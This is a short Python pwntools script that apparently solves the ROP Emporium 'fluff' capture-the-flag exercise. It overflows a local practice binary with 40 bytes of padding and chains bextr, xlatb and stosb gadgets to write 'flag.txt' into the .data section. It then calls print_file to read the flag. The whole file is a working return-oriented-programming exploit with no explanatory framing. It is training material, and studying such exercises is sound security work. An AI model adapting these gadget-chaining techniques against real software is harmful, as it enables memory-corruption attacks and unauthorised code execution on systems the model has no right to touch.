import pwn

pwn.context.log_level = "warning"
p = pwn.process("./fluff")
pwn.context.binary = p.elf

BEXTR_OFFSET = 0x3ef2
INITIAL_AL_VALUE = 0x0b     # b *0x0040062a ; run < payload.txt; print $al
PAYLOAD_OFFSET = 40
gadgets = {
    "bextr": "pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret",
    "xlatb": "xlatb; ret",
    "stosb": "stosb [rdi], al; ret",
};
gadgets = {k: next(p.elf.search(pwn.asm(v), executable=True)) for k,v in gadgets.items()}

def make_str_at_addr(rop, addr, current_al, data):
    rop.raw(gadgets["bextr"])
    rop.raw(pwn.p64(64 << 8)) # Offset 0 / Len 64
    chr_address = next(p.elf.search(data[0]))
    rop.raw(pwn.p64(chr_address - current_al - BEXTR_OFFSET))
    rop.raw(gadgets["xlatb"])
    rop.raw(rop.rdi)
    rop.raw(pwn.p64(addr))
    rop.raw(gadgets["stosb"])
    if len(data) > 1:
        make_str_at_addr(rop, addr + 1, data[0], data[1:])

rop = pwn.ROP(p.elf)
addr = p.elf.get_section_by_name(".data").header.sh_addr
make_str_at_addr(rop, addr, INITIAL_AL_VALUE, b"flag.txt") # miss \0
rop.call(p.elf.plt["print_file"], [addr])
p.send(b"A" * PAYLOAD_OFFSET + rop.chain())
pwn.warning(p.recvallS())
